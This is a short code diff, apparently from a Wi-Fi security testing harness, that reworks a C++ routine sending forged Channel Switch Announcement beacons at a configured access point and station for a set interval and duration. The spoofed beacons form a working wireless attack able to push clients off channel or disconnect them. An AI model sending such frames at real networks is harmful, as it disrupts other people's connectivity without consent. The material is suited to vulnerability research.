@@ -31,20 +31,31 @@ void send_CSA_beacon(const HWAddress<6> &ap_mac,
 
     RadioTap radiotap;
     const int freq_mhz = hw_capabilities::channel_to_freq_mhz(ap_channel);
-    radiotap.channel(2437, RadioTap::OFDM);
+    radiotap.channel(freq_mhz, RadioTap::OFDM);
     radiotap.inner_pdu(beacon);
 
     PacketSender sender;
     sender.send(radiotap, iface);
 }
 
-void check_vulnerable(const HWAddress<6>& ap_mac, const HWAddress<6>& sta_mac, const string &iface_name, const string& ssid, int ap_channel, int new_channel) {
+void check_vulnerable(
+    const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
+    const string &iface_name, const string &ssid,
+    int ap_channel, int new_channel,
+    int ms_interval, int attack_time){
 
     const NetworkInterface iface(iface_name);
-    for(int i = 0; i < 500; i++) { //TODO
+
+    const auto start_time = chrono::steady_clock::now();
+    const auto end_time = start_time + chrono::seconds(attack_time);
+
+    while (chrono::steady_clock::now() < end_time) {
         log(LogLevel::DEBUG, "sending CSA");
         send_CSA_beacon(ap_mac, iface, ssid, ap_channel, new_channel);
+
+        std::this_thread::sleep_for(chrono::milliseconds(ms_interval));
     }
+
     cout << "check_vulnerable called with:\n"
               << "AP MAC: " << ap_mac << "\n"
               << "STA MAC: " << sta_mac << "\n"
@@ -104,7 +115,9 @@ void run_chs_attack(RunStatus& rs){
     const string essid = rs.config["actors"]["access_point"]["setup"]["program_config"]["ssid"];
     const int old_channel = rs.config["actors"]["access_point"]["setup"]["channel"];
     const int new_channel = rs.config["attack_config"]["new_channel"];
-    check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel);
+    const int ms_interval = rs.config["attack_config"]["ms_interval"];
+    const int attack_time = rs.config["attack_config"]["attack_time"];
+    check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
 
     //TODO log  client, CTRL-EVENT-STARTED-CHANNEL-SWITCH
     //TODO log client, CTRL-EVENT-DISCONNECTED
